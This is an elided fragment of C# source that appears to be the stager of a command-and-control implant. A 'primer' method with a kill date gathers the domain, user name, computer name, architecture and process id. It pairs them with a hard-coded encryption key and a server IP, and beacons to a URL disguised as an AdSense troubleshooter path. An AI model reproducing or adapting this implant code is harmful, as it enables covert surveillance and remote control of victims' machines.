...
public class Program
{
	...
	static void primer()
	{
		if (DateTime.ParseExact("01/06/2020", "dd/MM/yyyy", CultureInfo.InvariantCulture) > DateTime.Now)
		{
			var u = "";
			try
			{
			...
			var o = String.Format("{0};{1};{2};{3};{4};https://97.120.255.139:443", dn, u, cn, arch, pid);
			String key = "HQqxWMIDj98iEOeVl9sEhzGpLtxm9P5XuhvG/prQPAU=", baseURL = "https://97.120.255.139:443", s = "https://97.120.255.139:443/adsense/troubleshooter/1631343/?c";
